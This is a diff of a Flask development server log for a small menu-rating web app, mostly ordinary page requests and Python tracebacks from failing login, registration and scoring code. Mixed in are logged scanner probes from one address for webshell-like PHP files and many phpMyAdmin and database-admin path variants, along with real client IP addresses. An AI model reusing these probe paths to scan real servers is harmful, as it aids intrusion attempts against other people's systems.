-[2021-11-17 21:01:30,757] ERROR in __init__: Page_not_found!
-122.14.195.57 - - [17/Nov/2021 21:01:30] "GET /ak.php HTTP/1.1" 404 -
-[2021-11-17 21:01:30,906] ERROR in __init__: Page_not_found!
-122.14.195.57 - - [17/Nov/2021 21:01:30] "GET /baidoubi.php HTTP/1.1" 404 -
-[2021-11-17 21:01:31,460] ERROR in __init__: Page_not_found!
-122.14.195.57 - - [17/Nov/2021 21:01:31] "GET /hhhhhh.php HTTP/1.1" 404 -
-[2021-11-17 21:01:39,757] ERROR in __init__: Page_not_found!
-122.14.195.57 - - [17/Nov/2021 21:01:39] "GET /python.php HTTP/1.1" 404 -
-[2021-11-17 21:01:49,589] ERROR in __init__: Page_not_found!
-122.14.195.57 - - [17/Nov/2021 21:01:49] "GET /taisui.php HTTP/1.1" 404 -
- * Serving Flask app '__init__' (lazy loading)
- * Environment: production
-   WARNING: This is a development server. Do not use it in a production deployment.
-   Use a production WSGI server instead.
- * Debug mode: off
- * Running on all addresses.
-   WARNING: This is a development server. Do not use it in a production deployment.
- * Running on http://10.0.0.29:5000/ (Press CTRL+C to quit)
-122.14.195.57 - - [17/Nov/2021 21:08:14] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 -
-[2021-11-17 21:08:17,170] ERROR in app: Exception on /member/login.html [POST]
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
-  File "__init__.py", line 60, in login
-    check_password = login_check(id, pw)
-  File "/home/opc/arambyeol/user.py", line 38, in login_check
-    check_password = bcrypt.checkpw(input_password, account[1].encode('utf-8'))
-TypeError: 'NoneType' object is not subscriptable
-182.31.164.169 - - [17/Nov/2021 21:08:17] "POST /member/login.html HTTP/1.1" 500 -
-122.14.195.57 - - [17/Nov/2021 21:08:29] "GET /v/index.php HTTP/1.1" 404 -
-[2021-11-17 21:08:32,588] ERROR in app: Exception on /member/login.html [POST]
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
-  File "__init__.py", line 60, in login
-    check_password = login_check(id, pw)
-  File "/home/opc/arambyeol/user.py", line 38, in login_check
-    check_password = bcrypt.checkpw(input_password, account[1].encode('utf-8'))
-TypeError: 'NoneType' object is not subscriptable
-182.31.164.169 - - [17/Nov/2021 21:08:32] "POST /member/login.html HTTP/1.1" 500 -
-122.14.195.57 - - [17/Nov/2021 21:08:34] "GET /phpmyadm1n/index.php HTTP/1.1" 404 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET / HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET /static/css/index.css HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET /static/images/logo.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET /static/js/index.js HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET /static/images/x_icon.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET /static/images/empty_star.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:08:39] "GET /api/list HTTP/1.1" 200 -
-122.14.195.57 - - [17/Nov/2021 21:08:39] "GET /shaAdmin/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:08:43] "GET /phpMyadmi/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:06] "GET /phpMyAdmin123/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:15] "GET /phpMyAdmina/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:17] "GET /phpMydmin/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:30] "GET /phpmyadmin2222/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:37] "GET /phpmyadmin3333/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:41] "GET /php2MyAdmin/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:45] "GET /phpNyAdmin/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:09:49] "GET /download/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:03] "GET /123131/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:05] "GET /phpMyAdminn/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:05] "GET /phpMyAdminhf/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:15] "GET /phpMyAdmln/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:31] "GET /program/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:45] "GET /mysql/dbadmin/index.php HTTP/1.1" 404 -
-122.14.195.57 - - [17/Nov/2021 21:10:46] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 -
-182.31.164.169 - - [17/Nov/2021 21:11:05] "GET /member/login.html HTTP/1.1" 200 -
-122.14.195.57 - - [17/Nov/2021 21:11:05] "GET /SQL/index.php HTTP/1.1" 404 -
-[2021-11-17 21:11:07,025] ERROR in app: Exception on /member/login.html [POST]
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
-  File "__init__.py", line 60, in login
-    check_password = login_check(id, pw)
-  File "/home/opc/arambyeol/user.py", line 38, in login_check
-    check_password = bcrypt.checkpw(input_password, account[1].encode('utf-8'))
-TypeError: 'NoneType' object is not subscriptable
-182.31.164.169 - - [17/Nov/2021 21:11:07] "POST /member/login.html HTTP/1.1" 500 -
-122.14.195.57 - - [17/Nov/2021 21:11:17] "GET /manager/html HTTP/1.1" 404 -
-[2021-11-17 21:12:12,922] ERROR in app: Exception on /member/login.html [POST]
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
-  File "__init__.py", line 60, in login
-    check_password = login_check(id, pw)
-  File "/home/opc/arambyeol/user.py", line 38, in login_check
-    check_password = bcrypt.checkpw(input_password, account[1].encode('utf-8'))
-TypeError: 'NoneType' object is not subscriptable
-182.31.164.169 - - [17/Nov/2021 21:12:12] "POST /member/login.html HTTP/1.1" 500 -
-182.31.164.169 - - [17/Nov/2021 21:12:32] "GET /member/register.html HTTP/1.1" 200 -
-[2021-11-17 21:12:35,094] ERROR in app: Exception on /member/register.html [POST]
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
-  File "__init__.py", line 49, in register
-    useradd(id, pw)
-  File "/home/opc/arambyeol/user.py", line 13, in useradd
-    cursor.execute(sql)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 148, in execute
-    result = self._query(query)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 310, in _query
-    conn.query(q)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 547, in query
-    self._execute_command(COMMAND.COM_QUERY, sql)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 793, in _execute_command
-    raise err.InterfaceError(0, "")
-pymysql.err.InterfaceError: (0, '')
-182.31.164.169 - - [17/Nov/2021 21:12:35] "POST /member/register.html HTTP/1.1" 500 -
-[2021-11-17 21:16:23,416] ERROR in app: Exception on /member/register.html [POST]
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
-  File "__init__.py", line 48, in register
-    if(check_userId(id) != True):   # id 가 이미 존재하면 true
-  File "/home/opc/arambyeol/user.py", line 20, in check_userId
-    cursor.execute(sql)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 148, in execute
-    result = self._query(query)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 310, in _query
-    conn.query(q)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 547, in query
-    self._execute_command(COMMAND.COM_QUERY, sql)
-  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 793, in _execute_command
-    raise err.InterfaceError(0, "")
-pymysql.err.InterfaceError: (0, '')
-182.31.164.169 - - [17/Nov/2021 21:16:23] "POST /member/register.html HTTP/1.1" 500 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET / HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET /static/css/index.css HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET /static/js/index.js HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET /static/images/logo.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET /static/images/empty_star.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET /static/images/x_icon.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:16:29] "GET /api/list HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:16:50] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:16:53] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:16:54] "GET /static/images/full_star.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:16:55] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:16:56] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:00] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:01] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:03] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:04] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:06] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:07] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:08] "GET /static/images/full_star.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:17:09] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:10] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:11] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:12] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:14] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:14] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:17] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:18] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:21] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:23] "GET /static/images/full_star.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:17:23] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:25] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:27] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:17:27] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:18:03] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:18:04] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:18:06] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:18:08] "GET /static/images/full_star.png HTTP/1.1" 304 -
-182.31.164.169 - - [17/Nov/2021 21:18:09] "POST /api/score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:18:10] "POST /api/menu_score HTTP/1.1" 200 -
-182.31.164.169 - - [17/Nov/2021 21:18:12] "POST /api/score HTTP/1.1" 200 -
+  File "/home/opc/arambyeol/__init__.py", line 204, in get_score
+    if score[0]['score'] == None:
+IndexError: tuple index out of range
+203.255.3.172 - - [21/Nov/2021 16:17:13] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:17:14] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:15] "POST /api/score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/js/index.js HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/images/logout.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:16] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:17] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:17:18] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:17:20] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/js/index.js HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/images/logout.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:18:35] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:37] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:18:38] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:18:39] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/js/index.js HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/images/logout.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:19:39] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:41] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:19:42] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:19:43] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:21:55] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:21:55] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:21:55] "GET /static/js/index.js HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:21:55] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:21:55] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:21:55] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:21:56] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:21:56] "GET /static/images/logout.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:21:56] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:21:56] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:21:59] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:21:59] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:22:01] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:22:04] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:22:04] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /static/css/index.css HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /static/js/index.js HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /static/images/x_icon.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /static/images/logo.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /static/images/empty_star.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:48] "GET /static/images/logout.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:49] "GET /static//images/favicon.ico HTTP/1.1" 308 -
+203.255.3.172 - - [21/Nov/2021 16:32:49] "GET /static/images/favicon.ico HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:51] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:32:53] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:53] "GET /static/images/full_star.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:56] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 16:32:56] "GET /static/images/full_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 16:32:59] "POST /api/menu_score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 16:33:17] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 16:33:17] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 16:33:17] "GET /static/images/login.png HTTP/1.1" 304 -
